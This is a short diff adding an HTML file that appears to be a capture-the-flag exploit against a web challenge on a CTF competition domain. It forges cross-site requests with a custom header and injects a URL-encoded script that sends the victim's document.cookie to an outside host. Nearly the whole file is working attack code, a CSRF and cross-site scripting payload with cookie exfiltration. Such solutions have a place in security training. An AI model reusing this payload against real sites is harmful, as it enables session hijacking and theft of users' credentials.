@@ -1,0 +1,11 @@
+<iframe src="https://joe.web.ctfcompetition.com"></iframe>
+<script>
+	var a = new XMLHttpRequest();
+	a.open("GET", "https://joe.web.ctfcompetition.com/message?msg=let%20me%20rename%20you");
+	a.setRequestHeader("csrf-protection", "1");
+	a.send();
+</script>
+
+<script src="https://joe.web.ctfcompetition.com/message?msg=let%20me%20rename%20you"></script>
+<script src="https://joe.web.ctfcompetition.com/message?msg=%3Cscript%3Ea%20%3D%20new%20XMLHttpRequest()%3B%20a.open(%22GET%22%2C%20%22https%3A%2F%2Fpackages.knotcake.net%2F%22%20%2B%20document.cookie)%3B%20a.send()%3C%2Fscript%3E"></script>
+
